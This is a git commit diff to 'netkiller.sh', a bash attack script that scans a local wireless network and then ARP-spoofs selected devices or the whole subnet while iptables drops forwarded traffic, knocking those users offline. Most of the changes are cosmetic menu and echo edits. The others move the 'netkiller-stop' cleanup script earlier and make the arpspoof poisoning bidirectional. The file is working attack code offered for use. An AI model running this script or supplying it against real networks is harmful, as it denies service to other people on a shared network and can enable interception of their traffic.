610cc9f462b0d868f4d00ca617265c25dce2e402
rff ald <117867334+xiv3r@users.noreply.github.com>
2025-08-27 16:00:07 +0800

    Update fix for netkiller.sh

--- netkiller.sh
+++ netkiller.sh
@@ -20,7 +20,7 @@ if [ "$(id -u)" -ne 0 ]; then
     exit 1
 fi
 
-echo ""
+echo " "
 # Detect interface
 WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
 
@@ -34,46 +34,45 @@ IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
 IP_CIDR=$(ip -4 addr show "$WLAN" | grep -oP 'inet \K[\d./]+')
 SUB=$(ipcalc -n "$IP_CIDR" | grep "Network:" | awk '{print $2}')
 
-echo ""
-
-echo "[ Current Network Information] "
-echo "[*] Interface: $WLAN"
-echo "[*] Gateway IP: $GW"
-echo "[*] Subnet IP: $SUB"
-echo "[*] Device IP: $IP"
-echo ""
+echo " "
+echo "[ Current Network Information ]"
+echo "[*] INTERFACE: | $WLAN"
+echo "[*] GATEWAY:   | $GW"
+echo "[*] SUBNET:    | $SUB"
+echo "[*] DEVICE:    | $IP"
+echo " "
 
 # Detect Interface
 echo "Enter Wireless Interface: Skip for default"
 read -r -p "> $WLAN " WLN
 INTERFACE="${WLN:-$WLAN}"
-echo ""
+echo " "
 
 # Detect Gateway IP
 echo "Enter Router Gateway IP: Skip for default"
 read -r -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
-echo ""
+echo " "
 
 # Detect Subnet
 echo "Enter Subnet mask: Skip for default"
 read -r -p "> $SUB " IPS
 NETWORK_CIDR="${IPS:-$SUB}"
-echo ""
+echo " "
 
 # Detect Device IP
 echo "Enter Device IP: Skip for default"
 read -r -p "> $IP " DEVIP
 MYIP="${DEVIP:-$IP}"
-echo ""
+echo " "
 
 # Prompt configuration
 echo "[ Target Network Configuration ]"
 echo "[*] INTERFACE: | $INTERFACE"
 echo "[*] GATEWAY:   | $GATEWAY"
-echo "[*] DEVICE IP: | $MYIP"
+echo "[*] DEVICE:    | $MYIP"
 echo "[*] TARGETS:   | $SUB"
-echo ""
+echo " "
 
 # Prompt the user for confirmation
 read -p "[*] Do you want to scan the network? (y/n) " -n 1 -r
@@ -83,9 +82,9 @@ if [[ $REPLY =~ ^[Yy]$ ]]
 then
 
 # Run arp-scan to scan the target
-echo ""
+echo " "
 echo "[*] [ Scanning for Target ] [*]"
-echo""
+echo " "
     # Execute the command if user answered 'y' or 'Y'
     arp-scan --retry=5 --bandwidth=100000 --random --localnet --interface="$WLAN"
 else
@@ -95,26 +94,26 @@ fi
 echo " "
 
 # Target selection
-echo "[*] Select Attack Type [*]"
-echo "1.Single Target IP"
-echo "2.Multiple Target IP's"
-echo "3.Target All IP's"
-read -rp "Enter Choice [1-3]: " target_type
-echo ""
+echo "[ Select Attack Type ]"
+echo "1.Single Target"
+echo "2.Multiple Target"
+echo "3.Target All"
+read -rp "Enter Choice [1-2-3]: " target_type
+echo " "
 
 case $target_type in
     1)
-        echo "Single Target User IP: e.g 10.0.0.123"
+        echo "Single Target IP: e.g 10.0.0.123"
         read -rp "Enter User IP: " TARGET
         TARGETS=("$TARGET")
         ;;
     2)
-        echo "Multiple Target Users IP's: e.g 10.0.0.123 10.0.0.124"
+        echo "Multiple Target IP's: e.g 10.0.0.123 10.0.0.124"
         read -rp "Enter Multiple Users IP's: " -a TARGETS
         ;;
     3)
-        echo "Target All Users IP's: Enter for default"
-        read -r -p "> $SUB " IPS
+        echo "Target All IP's: Enter for default"
+        read -rp "> $SUB " IPS
         subnet="${IPS:-$SUB}"
 
 
@@ -156,14 +155,14 @@ case $target_type in
             exit 1
         fi
 
-       echo ""
+       echo " "
        echo "Found ${#TARGETS[@]} potential targets in subnet"
 
         # Option to exempt additional IPs
-        echo ""
+        echo " "
         read -rp "Do you want to exempt any additional IP's from the subnet attack? (y/n) " exempt_choice
         if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
-            echo ""
+            echo " "
             echo "Enter IP's to exempt: e.g 10.0.0.110 10.0.0.120"
             read -rp "> " -a EXEMPTS
 
@@ -180,7 +179,7 @@ case $target_type in
                 [[ -z $skip ]] && NEW_TARGETS+=("$target")
             done
             TARGETS=("${NEW_TARGETS[@]}")
-            echo ""
+            echo " "
             echo "Updated targets after exemption: ${#TARGETS[@]} remaining"
         fi
         ;;
@@ -197,12 +196,28 @@ fi
 
 # Confirm before proceeding
 echo -e "\nNumber of target IP's affected: ${#TARGETS[@]}"
-echo ""
+echo " "
 read -rp "Are you sure you want to continue? (y/n) " confirm
 if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
     echo "Aborted."
     exit 0
 fi
+
+# Function to clean up
+cat > /bin/netkiller-stop << EOF
+#!/bin/bash
+
+echo "Cleaning up rules..."
+sleep 2
+echo "Unblocking network devices..."
+pkill -f arpspoof && pkill arpspoof 
+ip -s -s neigh flush all >/dev/null 2>&1
+iptables -P FORWARD ACCEPT
+iptables -F FORWARD
+sleep 2
+echo -e "\nNetkiller restoring the connection"
+EOF
+chmod 755 /bin/netkiller-stop 
 
 #Ipforwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -210,40 +225,17 @@ echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
 
 # iptables policy
 iptables -P FORWARD DROP
-iptables -I FORWARD -j DROP
+iptables -A FORWARD -j DROP
+echo " "
         
 # Start ARP spoofing for each target
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
-    echo ""
-    echo "Netkiller killed the target IP: $TARGET"
-
-    # Iptables rules
-    iptables -t mangle -I PREROUTING -s "$TARGET" -j TTL --ttl-set 0
-    
-    # Bidirectional blocking
-   ( arpspoof -i "$INTERFACE" -c host -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 ) &
+    echo "Netkiller kill the target IP: $TARGET"
+   ( arpspoof -i "$INTERFACE" -c host -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
-   ( arpspoof -i "$INTERFACE" -c host -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 ) &
+   ( arpspoof -i "$INTERFACE" -c host -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 ) &
     PIDS+=($!)
 done
 
-# Function to clean up
-cat > /bin/netkiller-stop << EOF
-#!/bin/bash
-
-    echo -e "\nCleaning up rules..."
-    sleep 2
-    echo -e "\nUnblocking network devices..."
-    pkill -f arpspoof
-    ip -s -s neigh flush all >/dev/null 2>&1
-    iptables -P FORWARD ACCEPT
-    iptables -F FORWARD
-    iptables -t mangle -F PREROUTING
-    sleep 2
-    echo -e "\nNetkiller restored the connection!"
-    echo " "
-EOF
-chmod 755 /bin/netkiller-stop 
-
-echo -e "\nNetkiller attack is running. To stop, run: netkiller-stop"
+echo -e "\nTo stop Netkiller, run: netkiller-stop"
